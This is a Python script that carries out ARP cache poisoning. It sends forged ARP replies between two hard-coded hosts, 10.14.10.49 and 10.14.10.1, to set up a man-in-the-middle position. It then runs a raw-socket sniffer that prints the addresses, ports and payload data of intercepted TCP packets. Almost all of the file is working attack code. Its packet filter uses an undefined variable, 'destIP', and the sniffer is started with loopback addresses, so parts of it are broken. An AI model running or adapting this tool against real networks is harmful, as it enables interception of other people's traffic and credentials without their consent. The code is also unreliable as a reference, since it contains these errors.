from struct import *
import subprocess
import socket
import sys
import re
from threading import Thread


def arp_reply(target_ip, sender_ip, sender_mac = 0):
	s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
	s.bind(('enp0s3', socket.SOCK_RAW))

	#Gets the mac address for this computer
	this_mac = s.getsockname()[4]

	#Finds sender_mac
	if sender_mac == 0:
		sender_mac = this_mac
	else:
		sender_mac = pack('!6B', *[int(x, 16) for x in sender_mac.split(':')])

	#ARPs for the targets mac address
	target_mac = subprocess.check_output(['arping','-f',target_ip])
	target_mac = re.search('([0-9A-F]{2}[:]){5}([0-9A-F]{2})', str(target_mac)).group(0)
	target_mac = pack('6B', *[int(x, 16) for x in target_mac.split(':')])

	#Packs target and sender ip's
	target_ip = pack('!4B', *[int(x) for x in target_ip.split('.')])
	sender_ip = pack('!4B', *[int(x) for x in sender_ip.split('.')])

	#Creates the ethernet frame
	arp_packet = [
		#Ethernet Header
		target_mac,#Destination mac address
		this_mac,#sender_mac,#Source mac address
		pack('>H', 0x0806),#Protocol type (ARP = 0x0806)

		#ARP Header
		pack('>H', 0x0001),#Hardware type (Ethernet(10 Mb) = 1)
		pack('>H', 0x0800),#Protocol type (IP = 0x0800)
		pack('>B', 0x06),#Mac address length
		pack('>B', 0x04),#Ip address length
		pack('>H', 0x0002),#Opcode (ARP reply = 2)
		sender_mac,#Sender mac address
		sender_ip,#Sender ip address
		target_mac,#Target mac address
		target_ip#Target ip address
	]

	#Sends the arp reply
	s.send(b''.join(arp_packet))
	s.close()

def mitm(host1, host2):
	arp_reply(host1, host2)
	arp_reply(host2, host1)

def listen_to_incoming_packets(Host_One_IP, Host_Two_IP):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    while True:
        packet = s.recvfrom(65565)
        packet = packet[0]
        ip_header = packet[0:20]
        unpacked_iph = unpack('>BBHHHBBH4s4s', ip_header)
        #  unpacked_iph:
        #-----------------
        #  index:
        #   0 -  Version [0000]  IP Header Length [0000] (8 bits)
        #   1 - Type of Service (8 bits)
        #   2 - Size of Datagram (16 bits)
        #   3 - Identification (16 bits)
        #   4 - Flags [000] Fragmentation Offset [13 bits] (16 bits)
        #   5 - TTL (8 bits)
        #   6 - Protocol (8 bits)
        #   7 - Checksum (16 bits)
        #   8 - Source IP (32 bits)
        #   9 - Destination IP (32 bits)

        ip_header_length = (unpacked_iph[0] & 0xF) * 4
        srcIP = socket.inet_ntoa(unpacked_iph[8])
        dstIP = socket.inet_ntoa(unpacked_iph[9])

        tcp_header = packet[ip_header_length:ip_header_length+20]
        unpacked_tcp = unpack('>HHLLBBHHH', tcp_header)
        #  unpacked_tcp:
        #-----------------
        #  index:
        #   0 -  Source Port (16 bits)
        #   1 - Destination Port (16 bits)
        #   2 - Sequence Number (32 bits)
        #   3 - Acknowlegement Number (32 bits)
        #   4 - Data Offset [0000] Reserved [0000] (8 bits)
        #   5 - Reserved [00] Control Bits [000000] (8 bits)
        #   6 - Window (16 bits)
        #   7 - Checksum (16 bits)
        #   8 - Urgent Pointer (16 bits)

        srcPort = unpacked_tcp[0]
        dstPort = unpacked_tcp[1]
        tcp_header_length = (unpacked_tcp[4] >> 4) * 4

        header_size = ip_header_length + tcp_header_length

        data = packet[header_size:]

        if srcIP == Host_One_IP or srcIP == Host_Two_IP or destIP == Host_One_IP or destIP == Host_Two_IP:
            print('SrcIP: ' + str(srcIP) + ' SrcPort: ' + str(srcPort) + ' DestIP: ' + str(dstIP) + ' DestPort: ' + str(dstPort) + '\nData: ' + str(data))

Thread(target=listen_to_incoming_packets, args=('127.0.0.1', '127.0.0.1')).start()
mitm('10.14.10.49', '10.14.10.1')
